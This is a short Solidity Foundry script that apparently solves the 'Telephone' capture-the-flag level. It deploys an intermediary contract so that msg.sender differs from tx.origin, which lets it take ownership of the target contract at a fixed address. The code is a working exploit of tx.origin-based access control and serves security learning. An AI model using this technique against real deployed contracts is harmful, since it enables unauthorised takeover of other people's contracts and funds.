//SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

// Goal:
// you claim ownership of the contract

//Solution
//Create another intermediary contract so that the msg.sender and the tx.origin are different.

import {Telephone} from "../src/Telephone.sol";
import {Script} from "forge-std/Script.sol";
import {console} from "forge-std/Test.sol";

contract IntermediaryContract {
    constructor(Telephone _telephone, address _newOwner) {
        _telephone.changeOwner(_newOwner);
    }
}

contract TelephoneSolution is Script {
    Telephone public telephoneInstance =
        Telephone(payable(0xAA36d32efee64fEe39d6F00487a7EA2E5AFa71F2));

    function run() external {
        vm.startBroadcast(vm.envUint("PRIVATE_KEY"));

        new IntermediaryContract(
            telephoneInstance,
            vm.envAddress("MY_ADDRESS")
        );

        vm.stopBroadcast();
    }
}
